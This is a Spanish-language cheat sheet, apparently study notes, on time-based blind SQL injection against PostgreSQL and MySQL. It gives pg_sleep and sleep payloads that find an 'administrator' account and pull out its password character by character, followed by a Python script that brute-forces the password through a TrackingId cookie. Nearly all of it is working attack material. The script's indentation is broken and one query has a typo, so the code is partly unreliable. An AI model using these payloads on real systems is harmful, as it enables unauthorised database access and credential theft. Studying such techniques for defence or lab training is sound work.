# Inyección SQL Blind basado en tiempo para extraer datos 

Tags: #SQLI #Postgre_SQL  #MySQL #BurpSuite 

```mysql 
❯ ' || pg_sleep(5) -- -          # Hacer que la web tarde 5 segundos 

❯ ' %3b select pg_sleep(5) -- -
	# Se debe urlencodear '; = %3b' para que no muestre un error 

# Cuando sea true la web tardará 5 seg en responder, de lo contrario que cargue inmediatamente
❯ ' %3b select case when(1=1) then pg_sleep(5) else pg_sleep(0) end -- -   

# Si existe el usuario 'administrator' en la tabla users tardará 5 seg en responder 
❯ ' %3b select case when(username='administrator') then pg_sleep(5) else pg_sleep(0) end from users -- - 

# Si existe el usuario 'administrator' y su longitud de passwd es igual a 20 tardará 5 seg en responder 
❯ ' %3b select case when(username='administrator' and length(password)=20) then pg_sleep(5) else pg_sleep(0) end from users -- - 
``` 

```mysql 
# Para MySQL 

# Si el primer caracter del nombre de la DB es igual a 'a' tardará 2 seg en responder, de lo contrario 0
❯ ' and if(substring(database(),1,1)='a',sleep(2), sleep(0)) -- -   

# Usando nested queries 
❯ ' and if(substr((select password form users where username='administrator'),1,1)='a',sleep(2), sleep(0)) -- - 
```

### Conocer la password 

```mysql 
# Si la password del usuario 'administrator' es igual a 'a' tardará 5 seg en responder 
❯ ' %3b select case when(username='administrator' and substring(password,1,1)='a') then pg_sleep(2) else pg_sleep(0) end from users -- - 
```

```python 
#!/usr/bin/env python3

from pwn import *
import requests
import signal
import sys
import time
import string
import pdb


def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl + c
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "https://localhost/searchUsers.php"
characters = string.ascii_letters + string.digits    # Se puede colocar string.printable

def MakeSQLI():

    password = ""
    p1 = log.progress("SQLi")
    p1.status("Iniciando fuerza bruta")
    time.sleep(2)
    p2 = log.progress("Password")

    for position in range(1, 21):
	    for character in characters:
		    cookies = {
			    "TrackingId": "valor ' %3b select case when(username='administrator' and substring(password,%d,1)='%s') then pg_sleep(2) else pg_sleep(0) end from users -- -" % (position, character),
			    "session": "valor"           # El valor se obtiene de Burpsuite
		    }
		    p1.status(cookies['TrackingId'])
              time_start = time.time()
              r = requests.get(main_url, cookies=cookies)
              time_end = time.time()
              if time_end - time_start > 2:
                  password += character
			   p2.status(password)
			   break

if __name__ == '__main__':
    MakeSQLI()
```